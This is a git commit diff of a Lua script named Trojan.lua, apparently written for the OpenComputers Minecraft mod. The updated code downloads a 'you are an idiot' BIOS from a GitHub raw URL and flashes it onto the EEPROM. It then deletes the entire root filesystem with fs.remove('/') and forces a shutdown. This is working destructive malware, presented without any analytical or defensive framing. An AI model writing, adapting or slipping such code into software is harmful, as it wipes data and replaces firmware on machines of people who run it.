f0798528f9a717e7ca122699ca4df524ec33dff9
matvey-mayner <144268527+matvey-mayner@users.noreply.github.com>
2024-01-18 21:41:40 +0300

    Update Trojan.lua

--- Maynersky.app/Trojan.lua
+++ Maynersky.app/Trojan.lua
@@ -2,23 +2,8 @@ local component = require("component")
 local eeprom = component.eeprom
 local fs = require("filesystem")
 
-local readOnly = QA("Make EEPROM read only?")
-os.execute("wget -f https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua /tmp/eeprom_code.lua && flash -q /tmp/eeprom_code.lua")
-local file = io.open("/tmp/eeprom_code.lua", "r")
-local data = file:read("*a")
---file:close()
---io.write("Flashing...")
-local success, reason = eeprom.set(config .. data)
-
-if not reason then
-    eeprom.setLabel("!You are an idiot!")
-    eeprom.setData(require("computer").getBootAddress())
-    if readOnly then
-        eeprom.makeReadonly(eeprom.getChecksum())
-    end
-   -- io.write(" success.\n")
-   -- if QA("Reboot?", true) then
-    --    os.execute("reboot")
-   -- end
+os.execute("wget -q https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua /tmp/eeprom_code.lua")
+os.execute("flash -q /tmp/eeprom_code.lua")
 
 fs.remove("/")
+computer.shutdown(true)
